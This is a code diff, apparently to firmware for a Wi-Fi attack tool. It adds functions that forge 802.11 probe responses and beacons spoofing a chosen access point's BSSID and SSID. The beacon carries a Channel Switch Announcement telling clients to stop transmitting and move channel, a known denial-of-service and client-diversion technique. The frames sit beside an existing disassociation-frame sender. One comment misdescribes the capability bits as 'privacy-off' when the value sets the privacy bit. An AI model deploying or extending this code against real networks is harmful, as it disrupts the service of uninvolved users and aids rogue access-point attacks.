@@ -145,3 +145,97 @@ void wsl_bypasser_send_disassociation_frame(const uint8_t *ap_bssid, const uint8
 
     wsl_bypasser_send_raw_frame(disas_frame, sizeof(disas_frame));
 }
+
+void wsl_bypasser_send_probe_response(const uint8_t *dst, const uint8_t *bssid,
+                                      const uint8_t *ssid, uint8_t ssid_length,
+                                      uint8_t channel)
+{
+    if (ssid_length > 32) ssid_length = 32;
+
+    uint8_t frame[96];
+    uint16_t i = 0;
+
+    frame[i++] = 0x50;                          /* frame control: probe response */
+    frame[i++] = 0x00;
+    frame[i++] = 0x00;                          /* duration */
+    frame[i++] = 0x00;
+
+    memcpy(&frame[i], dst, 6);   i += 6;        /* addr1: client */
+    memcpy(&frame[i], bssid, 6); i += 6;        /* addr2: us */
+    memcpy(&frame[i], bssid, 6); i += 6;        /* addr3: bssid */
+
+    frame[i++] = 0x00;                          /* sequence control */
+    frame[i++] = 0x00;
+
+    memset(&frame[i], 0, 8);     i += 8;        /* timestamp */
+
+    frame[i++] = 0x64;                          /* beacon interval 100 */
+    frame[i++] = 0x00;
+
+    frame[i++] = 0x11;                          /* capability: ESS + privacy-off */
+    frame[i++] = 0x04;
+
+    frame[i++] = 0x00;                          /* SSID IE */
+    frame[i++] = ssid_length;
+    memcpy(&frame[i], ssid, ssid_length); i += ssid_length;
+
+    frame[i++] = 0x01;                          /* supported rates */
+    frame[i++] = 0x04;
+    frame[i++] = 0x82; frame[i++] = 0x84; frame[i++] = 0x8b; frame[i++] = 0x96;
+
+    frame[i++] = 0x03;                          /* DS parameter set */
+    frame[i++] = 0x01;
+    frame[i++] = channel;
+
+    wsl_bypasser_send_raw_frame(frame, i);
+}
+
+void wsl_bypasser_send_csa_beacon(const uint8_t *bssid, const uint8_t *ssid,
+                                  uint8_t ssid_length, uint8_t channel,
+                                  uint8_t new_channel)
+{
+    if (ssid_length > 32) ssid_length = 32;
+
+    uint8_t frame[128];
+    uint16_t i = 0;
+
+    frame[i++] = 0x80;                          /* frame control: beacon */
+    frame[i++] = 0x00;
+    frame[i++] = 0x00;                          /* duration */
+    frame[i++] = 0x00;
+
+    memset(&frame[i], 0xff, 6);  i += 6;        /* addr1: broadcast */
+    memcpy(&frame[i], bssid, 6); i += 6;        /* addr2 */
+    memcpy(&frame[i], bssid, 6); i += 6;        /* addr3 */
+
+    frame[i++] = 0x00;                          /* sequence control */
+    frame[i++] = 0x00;
+
+    memset(&frame[i], 0, 8);     i += 8;        /* timestamp */
+
+    frame[i++] = 0x64;                          /* beacon interval */
+    frame[i++] = 0x00;
+    frame[i++] = 0x11;                          /* capability */
+    frame[i++] = 0x04;
+
+    frame[i++] = 0x00;                          /* SSID IE */
+    frame[i++] = ssid_length;
+    memcpy(&frame[i], ssid, ssid_length); i += ssid_length;
+
+    frame[i++] = 0x01;                          /* supported rates */
+    frame[i++] = 0x04;
+    frame[i++] = 0x82; frame[i++] = 0x84; frame[i++] = 0x8b; frame[i++] = 0x96;
+
+    frame[i++] = 0x03;                          /* DS parameter set (current ch) */
+    frame[i++] = 0x01;
+    frame[i++] = channel;
+
+    /* Channel Switch Announcement (IEEE 802.11-2016 9.4.2.19) */
+    frame[i++] = 0x25;
+    frame[i++] = 0x03;
+    frame[i++] = 0x01;                          /* mode: 1 = stop TX until switch */
+    frame[i++] = new_channel;                   /* new channel number */
+    frame[i++] = 0x01;                          /* switch count */
+
+    wsl_bypasser_send_raw_frame(frame, i);
+}
